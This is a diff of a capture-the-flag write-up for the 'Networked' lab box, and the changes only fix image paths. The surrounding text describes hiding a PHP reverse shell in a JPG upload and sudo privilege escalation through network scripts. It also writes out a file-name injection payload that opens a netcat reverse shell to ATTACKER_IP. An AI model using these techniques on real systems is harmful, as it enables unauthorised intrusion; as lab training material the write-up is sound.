@@ -37,7 +37,7 @@ There are just two ports open:
 
 Without credentials we can't do much on that version of OpenSSH other than username enumeration so I fire up Gobuster in order to find any subdirectories/subdomains in the background. Checking the landing page shows a quick message saying that the developers on the site are creating a new version of FaceMash and would like funding.
 
-![](../assets/img/2026-02-20-Networked/1.png)
+![](/assets/img/2026-02-20-Networked/1.png)
 
 Along with that text is a comment in the source code that says the following:
 
@@ -147,20 +147,20 @@ This code along with lib.php's `file_check` function performs some basic MIME ty
 
 I upload a valid JPG as a baseline so I can see what happens to it and find that our file's name is stored as the IP that uploaded it. Also upon navigating to `photos.php`, it's automatically rendered to the page.
 
-![](../assets/img/2026-02-20-Networked/2.png)
+![](/assets/img/2026-02-20-Networked/2.png)
 
 At first I attempted to stack multiple extensions by uploading shell.jpg.php, however  this was blocked upon submission which meant that we really needed a valid image. I also tried playing with the shell's magic bytes in order to trick the site in accepting our PHP code as a JPG file, but that didn't pan out either.
 
 ### Injecting PHP Code into Image Files
 The only real possibility I thought of left, was to inject PHP code into an image that we know will be accepted and hope that the site will execute it when we navigate to the full upload URL. I use Pentestmonkey's infamous PHP reverse shell inside of a random JPG pulled off the internet.
 
-![](../assets/img/2026-02-20-Networked/3.png)
+![](/assets/img/2026-02-20-Networked/3.png)
 
 We also need to make our file includes the `.php` extension so the site knows to execute our code. This exploit of stacking extensions didn't work earlier because I failed to upload a successful image, however reexamining the source code showed that as long as we had an accepted extension appended to our file, it would be fine.
 
 After setting up a Netcat listener and refreshing the `photos.php` page, the site renders our PHP code and we grab a reverse shell as the Apache user.
 
-![](../assets/img/2026-02-20-Networked/4.png)
+![](/assets/img/2026-02-20-Networked/4.png)
 
 ## Privilege Escalation
 I upgrade my shell using the typical `Python3 -c import pty` method and get to internal enumeration so that we can get a proper shell. Checking the `/home` directory shows just one other user on the system besides root named Guly. 
@@ -218,11 +218,11 @@ Our file must start with a semicolon to break out of the first portion that's us
 touch '; nc ATTACKER_IP PORT -c bash'
 ```
 
-![](../assets/img/2026-02-20-Networked/5.png)
+![](/assets/img/2026-02-20-Networked/5.png)
 
 After standing up a netcat listener and waiting for the cronjob to run, we grab a successful shell as Guly. I also immediately upgrade this using the python technique once again to stabilize it.
 
-![](../assets/img/2026-02-20-Networked/6.png)
+![](/assets/img/2026-02-20-Networked/6.png)
 
 ### Command Injection via Network-Scripts
 While going about the usual routes for root privesc on a system, I find that we are able to run a `changename.sh` script as root user. This script simply creates a network script for an interface named Guly while taking in a few user-supplied parameters.
@@ -257,6 +257,6 @@ I spent some time researching privilege escalation methods via network-scripts w
 
 Providing bash after a random word in the first name field spawns a root shell since we're running the script with Sudo.
 
-![](../assets/img/2026-02-20-Networked/7.png)
+![](/assets/img/2026-02-20-Networked/7.png)
 
 Grabbing the final flag under `/root/root.txt` completes this box. Overall, this challenge was a lot of code review and exploiting things via injections which was good practice. I hope this was helpful to anyone following along or stuck and happy hacking!
